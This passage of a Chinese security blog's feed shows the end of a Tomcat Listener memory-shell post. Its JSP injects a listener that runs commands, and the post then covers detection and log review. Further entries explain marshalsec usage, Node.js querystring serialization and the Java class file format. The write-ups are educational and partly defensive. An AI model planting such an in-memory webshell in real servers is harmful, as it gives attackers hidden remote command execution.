class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">ListenerTest</span> <span class="variable">listenerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerTest</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(listenerTest);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="images/image-20221028161442814.png" alt="image-20221028161442814"></p><p>接着访问其他路由都可以成功执行命令<br><img src="images/image-20221028161520448.png" alt="image-20221028161520448"></p><h2 id="内存马的查杀排查"><a href="#内存马的查杀排查" class="headerlink" title="内存马的查杀排查"></a>内存马的查杀排查</h2><p>这里使用的回忆飘如雪师傅写的内存马查杀 JSP 脚本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></table></figure></p><p>这里扫描到我们构造的 Listener 内存马，并且提供了 dump 操作供我们检查和 kill 操作供我们进行删除。<br><img src="images/image-20221029101459352.png" alt="image-20221029101459352"></p><p>除此之外我们也可以通过日志进行排查，首先上传的内存马大多都会执行命令，如果存在大量执行了命令但返回状态码为 404 或者 200 的记录可重点进行排查。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat内存马之Listener&quot;&gt;&lt;a href=&quot;#Tomcat内存马之Listener&quot; class=&quot;headerlink&quot; title=&quot;Tomcat内存马之Listener&quot;&gt;&lt;/a&gt;Tomcat内存马之Listener&lt;/h1&gt;&lt;h2 id=&quot;初</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/marshalsec/"/>
    <id>http://example.com/2022/11/19/marshalsec/</id>
    <published>2022-11-19T12:08:37.933Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="marshalsec使用"><a href="#marshalsec使用" class="headerlink" title="marshalsec使用"></a>marshalsec使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-a：生成exploit下的所有payload</li><li>-t：对生成的payloads进行解码测试</li><li>-v：verbose mode, 展示生成的payloads</li><li>gadget_type：指定使用的payload</li><li>arguments: payload运行时使用的参数</li><li>marshalsec.<marshaller>：指定exploits，根目录下的java文件名</marshaller></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;marshalsec使用&quot;&gt;&lt;a href=&quot;#marshalsec使用&quot; class=&quot;headerlink&quot; title=&quot;marshalsec使用&quot;&gt;&lt;/a&gt;marshalsec使用&lt;/h1&gt;&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/learn/"/>
    <id>http://example.com/2022/11/19/learn/</id>
    <published>2022-11-19T12:08:37.923Z</published>
    <updated>2021-03-04T14:58:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nodejs-的序列化与反序列化"><a href="#nodejs-的序列化与反序列化" class="headerlink" title="nodejs 的序列化与反序列化"></a>nodejs 的序列化与反序列化</h1><h1 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h1><p><code>stringify</code>函数的作用就是序列化对象，也就是说将对象类型转换成一个字符串类型（默认的分割符（”&amp;”）和分配符（”=”）），先介绍它的基本用法，在下一节里我们将学习如何替换默认分配符，下面我们就通过以下例子来清楚的认识一下吧！</p><p>例1：querystring.stringify(“对象”)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> querystring= <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = querystring.<span class="title function_">stringify</span>(&#123;<span class="attr">foo</span>:<span class="string">&#x27;bar&#x27;</span>,<span class="attr">cool</span>:[<span class="string">&#x27;xux&#x27;</span>, <span class="string">&#x27;yys&#x27;</span>]&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);　　</span><br></pre></td></tr></table></figure><p>运行结果：<br>foo=bar&amp;cool=xux&amp;cool=yys</p><p>对象被序列化为字符串之后默认是通过分割符（”&amp;”）和分配符（”=”）组成的，那可不可以改变呢，这节我们就来了解一下，是否可以自己去定义组合结果，看下面的小例子</p><p>例1：querystring.stringify(“对象”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.stringify(&#123;foo:&#x27;bar&#x27;,cool:[&#x27;xux&#x27;, &#x27;yys&#x27;]&#125;,&#x27;*&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#39;foo$bar*cool$xux*cool$yys&#39;</code></p><h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>接下来就来学习反序列化函数——parse函数，parse函数的作用就是反序列化字符串（默认是由”=”、”&amp;”拼接而成），转换得到一个对象类型。如下示例：</p><p>例1：querystring.parse(“字符串”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo=bar&amp;cool=xux&amp;cool=yys&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><code>&#123; foo: &#39;bar&#39;, cool: [&#39;xux&#39;, &#39;yys&#39;]&#125;</code></p><p>现在我们学习parse函数的扩展用法，和上面stringify函数的多参数用法不同的是，parse函数可以根据用户所自定义的分割符、分配符来反序列化字符串，从而得到相应的对象结果.如下示例：</p><p>例1：querystring.parse(“字符串”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo@bar$cool@xux$cool@yys&#x27;,&#x27;@&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#123; foo: &#39;&#39;, bar: &#39;cool&#39;, xux: &#39;cool&#39;, yys: &#39;&#39; &#125;</code></p><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/smiler/p/4741875.html">https://www.cnblogs.com/smiler/p/4741875.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nodejs-的序列化与反序列化&quot;&gt;&lt;a href=&quot;#nodejs-的序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;nodejs 的序列化与反序列化&quot;&gt;&lt;/a&gt;nodejs 的序列化与反序列化&lt;/h1&gt;&lt;h1 id=&quot;1-序列化&quot;&gt;&lt;a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/Java%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <id>http://example.com/2022/11/19/Java%E5%AD%97%E8%8A%82%E7%A0%81/</id>
    <published>2022-11-19T12:08:37.903Z</published>
    <updated>2022-11-04T08:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java字节码"><a href="#Java字节码" class="headerlink" title="Java字节码"></a>Java字节码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面学习已经知道<code>Java</code>文件<code>*.java</code>通过编译后会产生<code>*.class</code>文件，<code>class</code>文件有固定的二进制格式，其结构在<a href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">第四章：The class File Format</a>中写了详细说明。</p><p>示例文件<code>HelloWorld.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.classfile;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/27 16:46</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译解析流程为：<code>HelloWorld.java</code>—&gt;（经过编译）—&gt;<code>Java字节码</code>—&gt;（编译/解析）—&gt;<code>机器码</code></p><h2 id="class文件格式"><a href="#class文件格式" class="headerlink" title="class文件格式"></a>class文件格式</h2><p>class 文件的结构是固定的，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4 magic;</span><br><span class="line">    u2 minor_version;</span><br><span class="line">    u2 major_version;</span><br><span class="line">    u2 constant_pool_count;</span><br><span class="line">    cp_info constant_pool[constant_pool_count-<span class="number">1</span>];</span><br><span class="line">    u2 access_flags;</span><br><span class="line">    u2 this_class;</span><br><span class="line">    u2 super_class;</span><br><span class="line">    u2 interfaces_count;</span><br><span class="line">    u2 interfaces[interfaces_count];</span><br><span class="line">    u2 fields_count;</span><br><span class="line">    field_info fields[fields_count];</span><br><span class="line">    u2 methods_count;</span><br><span class="line">    method_info methods[methods_count];</span><br><span class="line">    u2 attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 JVM 规范中<code>u1</code>、<code>u2</code>和<code>u4</code>分别表示的是1、2、4个字节的无符号数，可以使用<code>java.io.DataInputStream</code>类中的对应方法：<code>readUnsignedByte</code>、<code>readUnsignedShort</code>、<code>readInt</code>方法读取。</p><p>除此之外，表结构可以由任意数量的可变长度的项组成，用于表示 class 中的复杂结构，如上述的：<code>cp_info</code>、<code>field_info</code>、<code>method_info</code>和<code>attribute_info</code>。</p><p><code>HelloWorld.class</code>文件十六进制内容：<br><img src="images/image-20220927165058781.png" alt="image-20220927165058781"></p><p>下面我们根据上面固定的<code>class</code>文件结构分析</p><h3 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h3><p><code>class</code>文件的标识符，也就是文件头，固定值为：<code>0xCAFEBABE</code></p><h3 id="Minor-Major-Version"><a href="#Minor-Major-Version" class="headerlink" title="Minor/Major_Version"></a>Minor/Major_Version</h3><p><code>class</code>文件的版本号由主版本号和副版本号组成，<code>minor_version</code>为副版本号，<code>major_version</code>为主版本号。这里<code>0x00000037</code>可以知道版本号为<code>JDK.11</code></p><p>版本对应表如下所示：</p><div class="table-container"><table><thead><tr><th>JDK版本</th><th><strong>十进制</strong></th><th><strong>十六进制</strong></th><th>发布时间</th></tr></thead><tbody><tr><td>JDK1.1</td><td>45</td><td>2D</td><td>1996-05</td></tr><tr><td>JDK1.2</td><td>46</td><td>2E</td><td>1998-12</td></tr><tr><td>JDK1.3</td><td>47</td><td>2F</td><td>2000-05</td></tr><tr><td>JDK1.4</td><td>48</td><td>30</td><td>2002-02</td></tr><tr><td>JDK1.5</td><td>49</td><td>31</td><td>2004-09</td></tr><tr><td>JDK1.6</td><td>50</td><td>32</td><td>2006-12</td></tr><tr><td>JDK1.7</td><td>51</td><td>33</td><td>2011-07</td></tr><tr><td>JDK1.8</td><td>52</td><td>34</td><td>2014-03</td></tr><tr><td>Java9</td><td>53</td><td>35</td><td>2017-09</td></tr><tr><td>Java10</td><td>54</td><td>36</td><td>2018-03</td></tr><tr><td>Java11</td><td>55</td><td>37</td><td>2018-09</td></tr><tr><td>Java12</td><td>56</td><td>38</td><td>2019-03</td></tr><tr><td>Java13</td><td>57</td><td>39</td><td>2019-09</td></tr><tr><td>Java14</td><td>58</td><td>3A</td><td>2020-03</td></tr><tr><td>Java15</td><td>59</td><td>3B</td><td>2020-09</td></tr></tbody></table></div><h3 id="constant-pool-count"><a href="#constant-pool-count" class="headerlink" title="constant_pool_count"></a>constant_pool_count</h3><p><code>constant_pool_count(常量池计数器)</code>的值等于常量池中的数量加1，注意的是<code>long</code>和<code>double</code>类型的常量池对象占用两个常量位。</p><h3 id="constant-pool"><a href="#constant-pool" class="headerlink" title="constant_pool"></a>constant_pool</h3><p><code>constant_pool(常量池)</code>是一种结构表，代表各种字符串常量、类和接口名称、字段名称以及其他在结构及其子结构中被引用的常量。</p><p>其中<code>cp_info</code>表示的是常量池对象，数据结构如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp_info &#123;</span><br><span class="line">   u1 tag;</span><br><span class="line">   u1 info[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>u1 tag;</code>表示的是常量池中的存储类型，常量池中的<code>tag</code>说明：</p><div class="table-container"><table><thead><tr><th>Constant Kind</th><th>Tag</th><th><code>class</code> file format</th><th>Java SE</th></tr></thead><tbody><tr><td><code>CONSTANT_Utf8</code></td><td>1</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Integer</code></td><td>3</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Float</code></td><td>4</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Long</code></td><td>5</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Double</code></td><td>6</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Class</code></td><td>7</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_String</code></td><td>8</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Fieldref</code></td><td>9</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_Methodref</code></td><td>10</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_InterfaceMethodref</code></td><td>11</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_NameAndType</code></td><td>12</td><td>45.3</td><td>1.0.2</td></tr><tr><td><code>CONSTANT_MethodHandle</code></td><td>15</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_MethodType</code></td><td>16</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Dynamic</code></td><td>17</td><td>55.0</td><td>11</td></tr><tr><td><code>CONSTANT_InvokeDynamic</code></td><td>18</td><td>51.0</td><td>7</td></tr><tr><td><code>CONSTANT_Module</code></td><td>19</td><td>53.0</td><td>9</td></tr><tr><td><code>CONSTANT_Package</code></td><td>20</td><td>53.0</td><td>9</td></tr></tbody></table></div><p>每一种<code>tag</code>都对应了不同的数据结构</p><h3 id="access-flags"><a href="#access-flags" class="headerlink" title="access_flags"></a>access_flags</h3><p><code>access_flags(访问标志)</code>表示的是某个类或者接口的访问权限和属性。</p><div class="table-container"><table><thead><tr><th>标志名</th><th>十六进制值</th><th>描述</th></tr></thead><tbody><tr><td>ACC_PUBLIC</td><td>0x0001</td><td>声明为public</td></tr><tr><td>ACC_FINAL</td><td>0x0010</td><td>声明为final</td></tr><tr><td>ACC_SUPER</td><td>0x0020</td><td>废弃/仅JDK1.0.2前使用</td></tr><tr><td>ACC_INTERFACE</td><td>0x0200</td><td>声明为接口</td></tr><tr><td>ACC_ABSTRACT</td><td>0x0400</td><td>声明为abstract</td></tr><tr><td>ACC_SYNTHETIC</td><td>0x1000</td><td>声明为synthetic，表示该class文件并非由Java源代码所生成</td></tr><tr><td>ACC_ANNOTATION</td><td>0x2000</td><td>标识注解类型</td></tr><tr><td>ACC_ENUM</td><td>0x4000</td><td>标识枚举类型</td></tr></tbody></table></div><p>同时这些标记可以通过或运算进行组合</p><h3 id="this-class"><a href="#this-class" class="headerlink" title="this_class"></a>this_class</h3><p><code>this_class(当前类名称)</code>表示的是当前<code>class</code>文件的类名所在常量池中的索引位置。</p><h3 id="super-class"><a href="#super-class" class="headerlink" title="super_class"></a>super_class</h3><p><code>super_class(当前类的父类名称)</code>表示的是当前<code>class</code>文件的父类类名所在常量池中的索引位置。<code>java/lang/Object</code>类的<code>super_class</code>的为0，其他任何类的<code>super_class</code>都必须是一个常量池中存在的索引位置。</p><h3 id="interfaces-count"><a href="#interfaces-count" class="headerlink" title="interfaces_count"></a>interfaces_count</h3><p><code>interfaces_count(当前类继承或实现的接口数)</code>表示的是当前类继承或实现的接口数。</p><h3 id="interfaces"><a href="#interfaces" class="headerlink" title="interfaces[]"></a>interfaces[]</h3><p><code>interfaces[interface_count](接口名称数组)</code>表示的是所有接口数组。</p><h3 id="fields-count"><a href="#fields-count" class="headerlink" title="fields_count"></a>fields_count</h3><p><code>fields_count(当前类的成员变量数)</code>表示的是当前<code>class</code>中的成员变量个数。</p><h3 id="fields"><a href="#fields" class="headerlink" title="fields[]"></a>fields[]</h3><p><code>field_info fields[fields_count](成员变量数组)</code>表示的是当前类的所有成员变量，<code>field_info</code>表示的是成员变量对象。</p><p><code>field_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">field_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员变量的修饰符；</li><li><code>u2 name_index;</code>表示的是成员变量的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员变量的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员变量的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员变量的属性信息；</li></ol><h3 id="methods-count"><a href="#methods-count" class="headerlink" title="methods_count"></a>methods_count</h3><p><code>methods_count(当前类的成员方法数)</code>表示的是当前<code>class</code>中的成员方法个数。</p><h3 id="methods"><a href="#methods" class="headerlink" title="methods[]"></a>methods[]</h3><p><code>method_info methods[methods_count](成员方法数组)</code>表示的是当前<code>class</code>中的所有成员方法，<code>method_info</code>表示的是成员方法对象</p><p><code>method_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">method_info &#123;</span><br><span class="line">   u2 access_flags;</span><br><span class="line">   u2 name_index;</span><br><span class="line">   u2 descriptor_index;</span><br><span class="line">   u2 attributes_count;</span><br><span class="line">   attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性结构：</p><ol><li><code>u2 access_flags;</code>表示的是成员方法的修饰符；</li><li><code>u2 name_index;</code>表示的是成员方法的名称；</li><li><code>u2 descriptor_index;</code>表示的是成员方法的描述符；</li><li><code>u2 attributes_count;</code>表示的是成员方法的属性数量；</li><li><code>attribute_info attributes[attributes_count];</code>表示的是成员方法的属性信息；</li></ol><h3 id="attributes-count"><a href="#attributes-count" class="headerlink" title="attributes_count"></a>attributes_count</h3><p><code>attributes_count(当前类的属性数)</code>表示当前<code>class</code>文件属性表的成员个数。</p><h3 id="attributes"><a href="#attributes" class="headerlink" title="attributes[]"></a>attributes[]</h3><p><code>attribute_info attributes[attributes_count](属性数组)</code>表示的是当前<code>class</code>文件的所有属性，<code>attribute_info</code>是一个非常复杂的数据结构，存储着各种属性信息。<br><code>attribute_info</code>数据结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">attribute_info &#123;</span><br><span class="line">   u2 attribute_name_index;</span><br><span class="line">   u4 attribute_length;</span><br><span class="line">   u1 info[attribute_length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>u2 attribute_name_index;</code>表示的是属性名称索引，读取<code>attribute_name_index</code>值所在常量池中的名称可以得到属性名称。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="images/1.jpeg" alt></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java字节码&quot;&gt;&lt;a href=&quot;#Java字节码&quot; class=&quot;headerlink&quot; title=&quot;Java字节码&quot;&gt;&lt;/a&gt;Java字节码&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前</summary>
      
    
    
    
    
  </entry>
  
</feed>
